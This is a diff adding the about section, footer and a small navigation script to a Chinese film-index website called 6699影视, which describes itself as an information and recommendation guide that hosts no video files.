+        <div class="hd" style="margin-bottom:18px">
+          <div><h2>关于 <em>6699影视</em></h2></div>
+        </div>
+        <p>6699影视最早是几个影迷自己用的找片小本子，后来条目越攒越多，就干脆整理成了现在这个导航站。站里没有播放源，也不做下载，只把影片的基本信息、题材标签、口碑情况和更新节奏梳理清楚。</p>
+        <p>选片这件事的麻烦之处，往往不是没得看，而是不知道该看什么。所以 <span class="kw">6699影视</span> 把「分类 + 榜单 + 日历」三块放在最前面，让你按心情、按热度、按更新时间都能进得去。</p>
+        <p>唯一官方入口是 <span class="kw">https://6699yingshi-app.github.io</span>，除此之外没有镜像站、没有备用域名，遇到同名站点请多加留意。</p>
+        <div class="btns">
+          <a class="btn btn-a" href="#" data-go="lineup">开始找片</a>
+          <a class="btn btn-b" href="#">收藏本站</a>
+        </div>
+      </div>
+      <aside class="panel">
+        <h3>站点信息</h3>
+        <p class="site">名称：6699影视<br>网址：https://6699yingshi-app.github.io<br>性质：影视信息索引与选片参考</p>
+        <ul>
+          <li><a href="#">今日片单 <span>每日 10:00</span></a></li>
+          <li><a href="#">热播榜单 <span>每日 00:00</span></a></li>
+          <li><a href="#">分类导航 <span>12 类</span></a></li>
+          <li><a href="#">追剧日历 <span>每周一</span></a></li>
+          <li><a href="#">观影指南 <span>持续更新</span></a></li>
+          <li><a href="#">纠错与建议 <span>2 个工作日</span></a></li>
+        </ul>
+      </aside>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="f-in">
+      <div class="f-col">
+        <h4>6699影视</h4>
+        <p>影视信息索引与选片参考站，不存储任何音视频文件。官方网址：https://6699yingshi-app.github.io</p>
+        <p>版权归各自权利人所有，本站仅作条目整理与观影视点分享。</p>
+      </div>
+      <div class="f-col">
+        <h4>快速入口</h4>
+        <p><a href="#">今日片单</a></p>
+        <p><a href="#">热播榜</a></p>
+        <p><a href="#">分类导航</a></p>
+        <p><a href="#">追剧日历</a></p>
+      </div>
+      <div class="f-col">
+        <h4>关于</h4>
+        <p><a href="#">站点介绍</a></p>
+        <p><a href="#">收录规则</a></p>
+        <p><a href="#">纠错入口</a></p>
+        <p><a href="#">版权说明</a></p>
+      </div>
+    </div>
+    <div class="f-bot">
+      <span>© 2026 <b>6699影视</b> · 6699yingshi-app.github.io</span>
+      <span>本页面为演示用途，站内条目信息与统计数据均为示例</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var burger=document.getElementById('burger');
+  var nav=document.getElementById('nav');
+  burger.addEventListener('click',function(){
+    var open=nav.classList.toggle('open');
+    burger.setAttribute('aria-expanded',open?'true':'false');
+  });
+  var ids={lineup:'lineup',rank:'rank',cate:'cate',cal:'cal',guide:'guide',about:'about'};
+  var links=document.querySelectorAll('[data-go]');
+  for(var i=0;i<links.length;i++){
+    links[i].addEventListener('click',function(e){
+      e.preventDefault();
+      var t=document.getElementById(ids[this.getAttribute('data-go')]);
+      if(t){t.scrollIntoView({behavior:'smooth',block:'start'});}
+      nav.classList.remove('open');
+      burger.setAttribute('aria-expanded','false');
+    });
+  }
+  var secs=document.querySelectorAll('section[id]');
+  var navs=document.querySelectorAll('.nav a[data-go]');
+  window.addEventListener('scroll',function(){
+    var y=window.scrollY+120,cur='';
+    for(var j=0;j<secs.length;j++){if(secs[j].offsetTop<=y){cur=secs[j].id;}}
+    for(var k=0;k<navs.length;k++){
+      navs[k].classList.toggle('on',navs[k].getAttribute('data-go')===cur);
+    }
+  });
+})();
+</script>
+</body>
+</html>
